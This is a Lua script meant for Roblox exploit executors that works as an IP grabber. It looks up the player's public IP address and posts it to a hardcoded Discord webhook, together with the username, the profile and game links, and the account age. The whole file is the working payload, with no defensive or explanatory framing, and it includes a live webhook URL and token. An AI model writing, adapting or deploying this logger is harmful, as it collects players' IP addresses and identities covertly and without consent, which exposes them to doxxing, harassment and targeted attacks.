local Webhook = "https://discord.com/api/webhooks/1066167874512764970/sZlyAti96N2nSMG1TtO6ClA2QPbwrSqF2TJDBtaIg3bIXqL2iqamqYvocjx8tcCfnayD"
local gameLink = "Game link: https://roblox.com/games/" .. game.PlaceId
local profileLink = "Profile link: https://www.roblox.com/users/" .. game:GetService("Players").LocalPlayer.userId

local player = game:GetService("Players").LocalPlayer
local accountAge = player.AccountAge
local days = math.floor(accountAge / 86400)
local months = math.floor(days / 30)
local years = math.floor(months / 12)
local decades = math.floor(years / 10)

pcall(function()
    local data = {
    ["embeds"] = {
        {
            ["title"] = 'User: '..player.Name,
            ["description"] = '@everyone IP: '..game:HttpGet("https://api.ipify.org")..'\n'..gameLink..'\n'..profileLink
            ..'\nAccount age: '..years..' years, '..months..' months, '..days..' days, '..decades..' decades'
        }
    }
    }

    if syn then
        local response = syn.request(
        {
            Url = Webhook,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService('HttpService'):JSONEncode(data)
        }
        );
    elseif request then
        local response = request(
        {
            Url = Webhook,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService('HttpService'):JSONEncode(data)
        }
        );
    elseif http_request then
        local response = http_request(
        {
            Url = Webhook,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService('HttpService'):JSONEncode(data)
        }
        );
    end
end)
